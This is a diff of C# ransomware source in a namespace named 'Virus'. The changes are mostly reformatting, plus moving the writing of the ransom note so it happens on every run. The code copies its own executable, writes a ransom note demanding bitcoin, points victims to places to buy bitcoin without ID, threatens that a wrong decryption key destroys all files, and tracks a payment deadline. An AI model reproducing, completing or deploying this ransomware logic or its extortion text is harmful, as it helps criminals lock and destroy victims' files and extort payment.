@@ -27,18 +27,17 @@ namespace Virus
             textBox2.Text = _bitcoinAddress;
             label1.Text = $"Send {_ransomAmount} worth of bitcoin to the address below.";
 
-            if (Application.ExecutablePath != decryptexe) 
+            if (Application.ExecutablePath != decryptexe)
             {
                 var appBytes = File.ReadAllBytes(Application.ExecutablePath);
-                File.WriteAllBytes(decryptexe,appBytes);
+                File.WriteAllBytes(decryptexe, appBytes);
             }
-            
-            AESencryption._aesKey = GetAESkey();    //gets encrypted aes key if it exists.
-            
+
+            File.WriteAllText(encrypttxt, $"List of files encrypted.");
+            File.WriteAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
+
             if (GetDestroyDate() == null)   //Not first time being run 
             {
-                File.AppendAllText(encrypttxt, $"List of files encrypted.");
-                File.AppendAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
                 DeleteDestroyDate();
                 SetDestroyDate(DateTime.Now.AddHours(_timetopay));
             }
@@ -79,12 +78,13 @@ namespace Virus
             DialogResult dialogResult = MessageBox.Show($"You have 1 attempt. If you use the wrong decryption code you will destroy all encrypted files. No matter how much money you offer they will be unrecoverable. Are You Sure You Want To Continue?", "Are You Sure?", MessageBoxButtons.YesNo);
             if (dialogResult == DialogResult.Yes)
             {
-                //new Task(() => { StartDecryption(textBox1.Text); }).Start();   //async
+
                 try
                 {
                     StartDecryption(textBox1.Text);
                 }
-                catch {
+                catch
+                {
                     MessageBox.Show("Decryption unsuccessful. We gave you a chance...");
                 }
 
@@ -94,7 +94,7 @@ namespace Virus
                 EndRoutine();
                 CloseApp();
             }
-            
+
         }
 
         private void Form2_FormClosing(object sender, FormClosingEventArgs e)
@@ -105,7 +105,7 @@ namespace Virus
         private void timer1_Tick(object sender, EventArgs e)
         {
             int i = 0;
-            
+
             if (DateTime.Now >= DateTimePlus12Hours && i > 3)
             {
                 timer1.Stop();
@@ -123,7 +123,5 @@ namespace Virus
 
             }
         }
-
-        
     }
 }
